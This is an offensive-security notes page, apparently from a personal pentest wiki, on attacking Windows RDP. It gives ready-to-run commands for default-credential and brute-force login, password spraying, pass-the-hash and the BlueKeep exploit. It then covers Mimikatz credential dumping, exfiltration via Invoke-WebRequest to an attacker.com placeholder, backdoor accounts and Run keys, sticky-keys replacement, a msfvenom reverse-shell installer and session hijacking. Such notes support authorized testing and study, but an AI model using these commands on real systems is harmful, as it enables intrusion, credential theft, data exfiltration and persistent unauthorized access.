---
id: Exploitation
aliases: []
tags:
  - Networking/Services/RDP/Exploitation
links:
  [[Services]]
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Common Issues {{{-->
## Common Issues

> [!info]-
>
> | Issue                | Description                              | Exploitation         |
> | -------------------- | ---------------------------------------- | -------------------- |
> | No NLA               | Network Level Authentication disabled    | Easier brute force   |
> | Weak encryption      | Low encryption settings                  | MITM possible        |
> | No account lockout   | Unlimited login attempts                 | Brute force friendly |
> | Certificate warnings | Self-signed or invalid cert              | MITM attacks         |
> | Clipboard enabled    | Clipboard sharing on                     | Data exfiltration    |
> | Drive sharing        | Local drives shared                      | File transfer        |

___

<!-- }}} -->

<!-- Authentication {{{-->
## Authentication

<!-- Default Credentials {{{-->
### Default Credentials

[[Usage#Connect|Connect]] using common credentials

> [!info]- Default Credentials
>
> ```sh
> Administrator:<blank>
> Administrator:admin
> Administrator:password
> Administrator:Password123
> admin:admin
> user:user
> ```

<!-- }}} -->

<!-- Brute Force {{{-->
### Brute Force

Brute forcing RDP credentials requires specialized tools
due to the protocol's complexity

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> Usernames
>
> - [[SecLists#Usernames|SecLists]]
>
> Passwords
>
> - [[SecLists#Passwords|SecLists]]
>
> - [[Rockyou#Wordlist|Rockyou]]
>
<!-- }}} -->

[[Crowbar]]

```sh
crowbar -b rdp -s $target/32 -u <username> -C <passwords.txt>
```

[[Ncrack]]

```sh
ncrack -vv --user <username> -P <passwords.txt> rdp://$target
```

[[Hydra]]

```sh
hydra -l <username> -P <passwords.txt> rdp://$target -t 1 -V -f
```

```sh
hydra -L <usernames.txt> -p <password> $target rdp
```

[[Metasploit]] - [Identify endpoints speaking the Remote Desktop Protocol (RDP)](https://www.rapid7.com/db/modules/auxiliary/scanner/rdp/rdp_scanner/)

<!-- Info {{{-->
> [!info]-
>
> This module attempts to connect
> to the specified Remote Desktop Protocol port
> and determines if it speaks RDP
>
> When available,
> the Credential Security Support Provider (*CredSSP*) protocol
> will be used to identify the version of Windows
> on which the server is running.
>
> Enabling the `DETECT_NLA` option will cause
> a second connection to be made to the server
> to identify if Network Level Authentication (*NLA*)
> is required.
>
<!-- }}} -->

```sh
use auxiliary/scanner/rdp/rdp_scanner
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use auxiliary/scanner/rdp/rdp_scanner
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> run
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Pass-the-Hash {{{-->
### Pass-the-Hash

Use NTLM hashes to authenticate to RDP without knowing plaintext passwords

<!-- Tip {{{-->
> [!tip]- Enable Restricted Admin Mode
>
> If Restricted Admin Mode is disabled the following error is prompted
>
- [ ] > ![[restricted-admin-mode.png]]
>
> Add a registry key `DisableRestrictedAdmin` (*REG_DWORD*)
> to `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`
>
> ```sh
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> ```
>
> ![[restricted-admin-mode-reg.png]]
>
<!-- }}} -->

[[xfreerdp]]

```sh
xfreerdp /u:<administrator> /pth:<NTHASH> /v:$target /cert:ignore
```

<!-- Info {{{-->
> [!info]-
>
> - `<NTHASH>`: NTLM hash for the administrator account
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
>  xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
> ```
<!-- }}} -->

[[Mimikatz]] (*from a compromised machine*)

```sh
sekurlsa::pth /user:<administrator> /domain:<DOMAIN> /ntlm:HASH /run:"mstsc /v:$target"
```

<!-- }}} -->

<!-- Password Spraying {{{-->
### Password Spraying

RDP Password Spraying

[[Crowbar]]

```sh
crowbar -b rdp -s $target -U <users.txt> -c '<password>'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
> ```
> ```sh
> 2022-04-07 15:35:50 START
> 2022-04-07 15:35:50 Crowbar v0.4.1
> 2022-04-07 15:35:50 Trying 192.168.220.142:3389
> 2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
> 2022-04-07 15:35:52 STOP
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- CVE Exploits {{{-->
## CVE Exploits

<!-- BlueKeep {{{-->
### BlueKeep

[CVE-2019-0708](https://nvd.nist.gov/vuln/detail/cve-2019-0708) —
Detect and exploit BlueKeep for unauthenticated remote code execution

<!-- Info {{{-->
> [!info]-
>
> A remote code execution vulnerability exists in Remote Desktop Services
> (*formerly known as Terminal Services*)
> when an unauthenticated attacker connects to the target system using RDP
> and sends specially crafted requests,
> aka. 'Remote Desktop Services Remote Code Execution Vulnerability'
>
> Affects
>
> - Windows 7 and Server 2008
> - XP, Server 2003
>
> Metasploit supported targets
>
> - Windows 7 SP1
> - Windows Server 2008 R2
<!-- }}} -->

[[Metasploit]] —
[CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check](https://www.rapid7.com/db/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep/)

```sh
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> run
> ```
>
<!-- }}} -->

[[Metasploit]] —
[CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free](https://www.rapid7.com/db/modules/exploit/windows/rdp/cve_2019_0708_bluekeep_rce/)

```sh
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
> ```
> ```sh
> set RHOSTS $target
> ```
> ```sh
> set TARGET 2
> ```
> ```sh
> exploit
> ```
>
> - `set TARGET 2`: Windows 7 x64
>
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Credential Harvesting {{{-->
## Credential Harvesting

Extract credentials and authentication data from compromised RDP systems

[[Mimikatz]] —
Read credentials from LSASS memory for currently logged-on sessions

```sh
sekurlsa::logonpasswords
```

<!-- Example {{{-->
> [!example]-
>
>
> ```sh
> mimikatz.exe
> ```
> ```sh
> privilege::debug
> ```
> ```sh
> sekurlsa::logonpasswords
> ```
<!-- }}} -->

[[Mimikatz]] — Extract cached domain login entries Windows keeps

```sh
lsadump::cache
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> mimikatz.exe
> ```
> ```sh
> privilege::debug
> ```
> ```sh
> lsadump::cache
> ```
<!-- }}} -->

Dump [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager)
registry hives

<!-- Example {{{-->
> [!example]-
>
> `HKLM\SAM` hive contains local account password hashes
>
> ```sh
> reg save HKLM\SAM C:\Windows\Temp\sam
> ```
>
> `HKLM\SYSTEM` contains boot keys used to decrypt password hashes
>
> ```sh
> reg save HKLM\SYSTEM C:\Windows\Temp\system
> ```
>
> `HKLM\SECURITY` contains [LSA](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)
> secrets which can contain service-accounts secrets, cached/secret credentials
> and keys an attacker can extract offline
>
> ```sh
> reg save HKLM\SECURITY C:\Windows\Temp\security
> ```
<!-- }}} -->

[[Impacket]] - [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
— Extract hashes

```sh
impacket-secretsdump -sam sam -system system LOCAL
```

___
<!-- }}} -->

<!-- Data Exfiltration {{{-->
## Data Exfiltration

Extract sensitive data from compromised RDP systems

Compress sensitive user data

```sh
Compress-Archive -Path <C:\Users\> -DestinationPath C:\Temp\exfil.zip
```

Transfer via shared drive (*if RDP was connected with `/drives` option*)

```sh
copy <C:\sensitive\data.txt> <\\tsclient\c\exfil\>
```

Upload to attacker server

```sh
Invoke-WebRequest -Uri http://<attacker.com/upload> -Method POST -InFile <C:\Temp\data.zip>
```

[[Base64]] encode and exfiltrate

```sh
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("<C:\Temp\data.zip>"))
```
```sh
Invoke-WebRequest -Uri http://<attacker.com/path> -Method POST -Body $data
```

<!-- Tip {{{-->
> [!tip]-
>
> - Transfer via RDP clipboard (*if enabled*)
> - Copy file in RDP session, paste on local machine
<!-- }}} -->

___
<!-- }}} -->

<!-- Lateral Movement {{{-->
## Lateral Movement

Move across the network laterally from compromised RDP systems

RDP to other machines

```sh
mstsc /v:$target
```

Pass-the-Hash to other systems

```sh
xfreerdp /u:<user> /pth:<HASH> /v:$target
```

PSExec with captured credentials

```sh
psexec \\$target -u <user> -p <password> cmd
```

WMI lateral movement

```sh
wmic /node:$target /user:<user> /password:<password> process call create "cmd.exe"
```

___

<!-- }}} -->

<!-- Persistence {{{-->
## Persistence

Create persistent backdoor access to compromised RDP systems

Backdoor User

1. Create new user

```sh
net user <user> <password> /add
```

2. Add user to `administrators` group

```sh
net localgroup administrators <user> /add
```

3. Add user to `Remote Desktop Users` group

```sh
net localgroup "Remote Desktop Users" <user> /add
```

Registry Run Key —
Automatically launch `backdoor.exe` when that user logs in

```sh
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

Scheduled Task —
Run `backdoor.exe` at logon with `SYSTEM` privileges

```sh
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru SYSTEM
```

Sticky Keys Backdoor (*persistent*)

```sh
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

```sh
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

___
<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Escalate privileges on compromised RDP systems

Enumerate [[Privileges]]

```sh
whoami /all
```
```sh
whoami /priv
```

Check for unquoted service paths

<!-- Info {{{-->
> [!info]-
>
> Windows can interpret unquoted service path components loosely,
> letting local attacker place a malicious executable
> in a higher-priority folder to run with service's privileges
> (*often `SYSTEM`*)
<!-- }}} -->

```sh
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v """
```

AlwaysInstallElevated check

<!-- Info {{{-->
> [!info]-
>
> Check whether the `AlwaysInstallElevated` policy is enabled
> for machine (`HKLM`) and user (`HKCU`) —
> if both are set to `1`, non-elevated MSI installs
> can run with `SYSTEM` privileges
<!-- }}} -->

```sh
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```
```sh
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

Exploit (*if enabled*)

1. [[msfvenom]] — Build a malicious installer

```sh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f msi > installer.msi
```

2. [msiexec](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec) —
Install silently

```sh
msiexec /quiet /qn /i installer.msi
```

___
<!-- }}} -->

<!-- Session Hijacking {{{-->
## Session Hijacking

Impersonate a user without their password

<!-- Warning {{{-->
> [!warning]
>
> `SYSTEM` [[Privileges]] required
>
<!-- }}} -->

1. Query logged in users

```sh
query user
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> query user
> ```
> ```sh
>  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
> >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
>  lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
> ```
<!-- }}} -->

2. [tscon](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) —
Connect to another desktop session

```sh
tscon <target_session_id> /dest:<attacker_session_name>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> tscon 4 /dest:rdp-tcp#13
> ```
>
<!-- }}} -->

Create a Windows service that execute binaries with `SYSTEM` privileges

<!-- Warning {{{-->
> [!warning]
>
> `Local Administrator` privilege required
<!-- }}} -->

<!-- Warning {{{-->
> [!warning]
>
> Patched on Windows Server 2019
<!-- }}} -->

1. Query active session names / IDs

```sh
query user
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> C:\htb> query user
> ```
> ```sh
>  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
> >juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
>  lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
> ```
<!-- }}} -->

2. [sc.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) —
Create a service and execute a command as `SYSTEM`

<!-- Info {{{-->
> [!info]-
>
> - `sessionhijack`: Name of 
> ```
> ```sh
> binpath=
> ```
>
<!-- }}} -->

```sh
sc.exe create <service_name> binpath= "cmd.exe /k tscon <target_session_id> /dest:<session_name>"
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
> ```
> ```sh
> [SC] CreateService SUCCESS
> ```
<!-- }}} -->

3. Start the created service

```sh
net start <service>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> net start sessionhijack
> ```
<!-- }}} -->

4. Once the service is started, a new terminal
with the hijacked user session should appear

```sh
whoami
```

```sh
whoami /priv
```

___
<!-- }}} -->

<!-- }}} -->
